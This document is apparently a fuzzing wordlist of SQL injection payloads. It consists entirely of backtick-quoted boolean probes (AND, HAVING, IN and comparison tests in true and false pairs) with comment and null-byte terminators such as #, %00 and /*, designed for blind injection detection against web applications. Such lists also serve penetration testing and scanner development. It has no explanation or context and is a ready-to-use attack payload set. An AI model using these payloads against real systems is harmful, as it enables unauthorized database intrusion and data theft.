+` AND `1337vnhacker`=`1338vnhacker`#
+` AND `a` < `asdf`#
+` AND `a` > `asdf`#
+` AND `a` IN `asdf`#
+` AND `a` NOT IN `asdf`#
+` HAVING `1337`=`1337`#
+` HAVING `1338`=`1337`#
+\` AND `1337`=`1337`#
+\` AND `1337`=`1338`#
+\` AND `1337vnhacker`=`1337vnhacker`#
+\` AND `1337vnhacker`=`1338vnhacker`#
+\` AND `a` < `asdf`#
+\` AND `a` > `asdf`#
+\` AND `a` IN `asdf`#
+\` AND `a` NOT IN `asdf`#
+\` HAVING `1337`=`1337`#
+\` HAVING `1338`=`1337`#
+` AND `1337`=`1337`%00
+` AND `1337`=`1338`%00
+` AND `1337vnhacker`=`1337vnhacker`%00
+` AND `1337vnhacker`=`1338vnhacker`%00
+` AND `a` < `asdf`%00
+` AND `a` > `asdf`%00
+` AND `a` IN `asdf`%00
+` AND `a` NOT IN `asdf`%00
+` HAVING `1337`=`1337`%00
+` HAVING `1338`=`1337`%00
+\` AND `1337`=`1337`%00
+\` AND `1337`=`1338`%00
+\` AND `1337vnhacker`=`1337vnhacker`%00
+\` AND `1337vnhacker`=`1338vnhacker`%00
+\` AND `a` < `asdf`%00
+\` AND `a` > `asdf`%00
+\` AND `a` IN `asdf`%00
+\` AND `a` NOT IN `asdf`%00
+\` HAVING `1337`=`1337`%00
+\` HAVING `1338`=`1337`%00
+` AND `1337`=`1337/*
+` AND `1337`=`1338/*
+` AND `1337vnhacker`=`1337vnhacker`/*
+` AND `1337vnhacker`=`1338vnhacker`/*
+` AND `a` < `asdf`/*
+` AND `a` > `asdf`/*
+` AND `a` IN `asdf`/*
+` AND `a` NOT IN `asdf`/*
+` HAVING `1337`=`1337`/*
+` HAVING `1338`=`1337`/*
+\` AND `1337`=`1337`/*
+\` AND `1337`=`1338`/*
+\` AND `1337vnhacker`=`1337vnhacker`/*
+\` AND `1337vnhacker`=`1338vnhacker`/*
+\` AND `a` < `asdf`/*
+\` AND `a` > `asdf`/*
+\` AND `a` IN `asdf`/*
+\` AND `a` NOT IN `asdf`/*
+\` HAVING `1337`=`1337`/*
+\` HAVING `1338`=`1337`/*
